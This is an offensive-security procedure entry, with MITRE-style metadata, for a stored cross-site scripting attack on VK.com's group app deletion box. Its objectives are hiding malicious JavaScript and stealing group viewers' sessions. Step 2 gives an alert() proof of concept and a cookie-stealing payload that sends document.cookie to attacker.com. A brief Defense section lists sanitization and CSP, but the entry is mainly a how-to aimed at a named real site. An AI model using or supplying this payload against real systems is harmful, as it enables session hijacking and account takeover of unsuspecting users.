---
id: proc-vk-xss-inject-266072
tags:
  - xss
  - stored-xss
  - injection
  - vk.com
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:23.581Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Malicious Script into VK Group App Deletion Box

## Summary

This procedure exploits insufficient input filtering in the VK.com group app deletion box to store a malicious JavaScript payload, which persists and can be rendered on group pages viewed by other users.

## Description

In VK.com groups, the app deletion interface allows administrators to remove integrated applications. Due to lack of proper sanitization, user-supplied input in the deletion confirmation box can include HTML and JavaScript tags. When injected, the payload is stored server-side and later displayed unsanitized on group pages, leading to stored XSS. This affects all viewers of the group, potentially compromising their accounts by stealing cookies, session tokens, or performing keylogging/phishing. Discovered during manual testing of VK applications and groups.

## Requirements

1. Valid VK.com account with administrative access to a target group
2. Browser with developer tools (e.g., Chrome DevTools) for payload crafting and testing
3. Basic knowledge of JavaScript for payload construction

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., using libraries like DOMPurify) on all user inputs, especially in admin interfaces
- Use Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript execution or unexpected network requests from group pages
- Regular security audits of group management features

## Objectives

1. Store malicious JavaScript in the group without immediate detection
2. Prepare for execution when group pages are accessed by victims
3. Enable data exfiltration or session hijacking for multiple users

## Instructions

### Step 1: Access Group App Management

**Context**: Gain entry to the vulnerable interface to locate the deletion box.

Log in to VK.com and navigate to the target group's settings. Go to the "Applications" or "Apps" section and select an app to delete, revealing the confirmation input box.

### Step 2: Craft and Inject Payload

**Context**: Create a payload that evades basic filters and achieves the desired malicious effect.

Use a simple test payload like `<script>alert('XSS in VK Group');</script>` for proof-of-concept, or an exfiltration payload like `<img src="x" onerror="fetch('http://attacker.com/log?data='+encodeURIComponent(document.cookie));">` to steal cookies silently. Paste the payload into the app deletion confirmation box and submit.

> The payload is stored without execution at this stage, confirming successful injection if it appears unaltered in the group's data.

### Step 3: Verify Storage

**Context**: Confirm the payload persists without sanitization.

Refresh the group app management page or inspect the network requests/dev tools to ensure the input is saved server-side. No command execution needed; visual confirmation suffices.

> Expected: Payload visible in the interface or source code of the group page elements.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[vk.com]]
